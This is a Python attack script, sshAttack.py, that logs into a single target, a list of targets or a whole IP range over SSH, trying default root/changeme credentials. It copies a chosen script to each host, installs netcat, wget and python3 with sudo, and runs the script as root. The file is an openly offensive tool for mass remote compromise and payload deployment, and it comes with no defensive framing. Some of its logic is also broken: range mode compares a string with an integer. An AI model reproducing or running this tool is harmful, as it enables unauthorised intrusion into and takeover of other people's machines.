import paramiko
import sys
import subprocess
import time

def main():
    option=""
    if(len(sys.argv) != 4):
        print("Usage: sshAttack.py {path to local script} {path to send to} {config: 1(single target), 2(list of targets), 3(range of targets)}")
    else:
        if(sys.argv[3] == "1"):
            target=input("Enter target IP: ")
            localPath=sys.argv[1] #PATH TO SUBJECT SCRIPT ON LOCAL MACHINE
            remotePath=sys.argv[2] #PATH TO SUBJECT SCRIPT ON TARGET MACHINE
            option=input("Enter username to use('d' for default of \"root\": ")
            if(option.lower() in ('d')):
                user="root"
            else:
                user=option
            option=input("Enter password to use('d' for default of \"changeme\": ")
            if(option.lower() in ('d')):
                password="changeme"
            else:
                password=option
            attack(localPath, remotePath, target, user, password)
            
        elif(sys.argv[3] == "2"):
            targetList=[]
            cont=True
            while(cont):
                option=input("Enter target IP('q' to stop entering): ")
                if(option.lower() in ('q')):
                    cont=False
                else:
                    targetList.append(option)
                    
            option=input("Enter username to use('d' for default of \"root\": ")
            if(option.lower() in ('d')):
                user="root"
            else:
                user=option
            option=input("Enter password to use('d' for default of \"changeme\": ")
            if(option.lower() in ('d')):
                password="changeme"
            else:
                password=option
                
            localPath=sys.argv[1] #PATH TO SUBJECT SCRIPT ON LOCAL MACHINE
            remotePath=sys.argv[2] #PATH TO SUBJECT SCRIPT ON TARGET MACHINE
            
            for target in targetList:
                attack(localPath, remotePath, target, user, password)
            
        elif(sys.argv[3] == "3"):
            prefix=input("Enter address prefix of target network: ") #PREFIX OF TARGET NETWORK
            highestNum=input("Enter highest value of the final octet: ") #HIGHEST VALUE OF FINAL OCTET
            lowestNum=input("Enter lowest value of the final octet: ") #LOWEST VALUE OF FINAL OCTET
            localPath=sys.argv[1] #PATH TO SUBJECT SCRIPT ON LOCAL MACHINE
            remotePath=sys.argv[2] #PATH TO SUBJECT SCRIPT ON TARGET MACHINE
            option=input("Enter username to use('d' for default of \"root\": ")
            if(option.lower() in ('d')):
                user="root"
            else:
                user=option
            option=input("Enter password to use('d' for default of \"changeme\": ")
            if(option.lower() in ('d')):
                password="changeme"
            else:
                password=option
            
            x=int(lowestNum)
            
            while(x <= highestNum):
                target=prefix+str(x)
                attack(localPath, remotePath, target, user, password)
                x=x+1
        
        print("Attack finished")
    
def attack(local_script_path, remote_script_path, remote_host, remote_user, remote_password):
    try:
        # Use SCP to copy the local script to the remote machine
        scp_command = f'scp {local_script_path} {remote_user}@{remote_host}:{remote_script_path}'
        subprocess.run(scp_command, shell=True, check=True)
        print(f"Script copied to {remote_host}")

        # Connect to the remote server using SSH
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(remote_host, username=remote_user, password=remote_password)
        
        # Attempt to install nc using apt and yum
        nc1_command = "sudo apt-get update && sudo apt-get install -y nc &"
        stdin, stdout, stderr = ssh_client.exec_command(nc1_command)
        print(stdout.read().decode('utf-8'))
        print(stderr.read().decode('utf-8'))
        
        nc2_command = "sudo yum install -y nc &"
        stdin, stdout, stderr = ssh_client.exec_command(nc2_command)
        print(stdout.read().decode('utf-8'))
        print(stderr.read().decode('utf-8'))
        
        # Attempt to install wget using apt and yum
        wget1_command = "sudo apt-get update && sudo apt-get install -y wget &"
        stdin, stdout, stderr = ssh_client.exec_command(wget1_command)
        print(stdout.read().decode('utf-8'))
        print(stderr.read().decode('utf-8'))
        
        wget2_command = "sudo yum install -y wget &"
        stdin, stdout, stderr = ssh_client.exec_command(wget2_command)
        print(stdout.read().decode('utf-8'))
        print(stderr.read().decode('utf-8'))
        
        # Attempt to install python3 using apt and yum
        getpy1_command = "sudo apt-get update && sudo apt-get install -y python3 &"
        stdin, stdout, stderr = ssh_client.exec_command(getpy1_command)
        print(stdout.read().decode('utf-8'))
        print(stderr.read().decode('utf-8'))
        
        getpy2_command = "sudo yum install -y python3 &"
        stdin, stdout, stderr = ssh_client.exec_command(getpy2_command)
        print(stdout.read().decode('utf-8'))
        print(stderr.read().decode('utf-8'))

        # Execute the script on the remote machine
        stdin, stdout, stderr = ssh_client.exec_command(f"sudo python3 {remote_script_path}")
        time.sleep(5)

        # Close the SSH connection
        ssh_client.close()
        print("Script executed successfully")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        
main()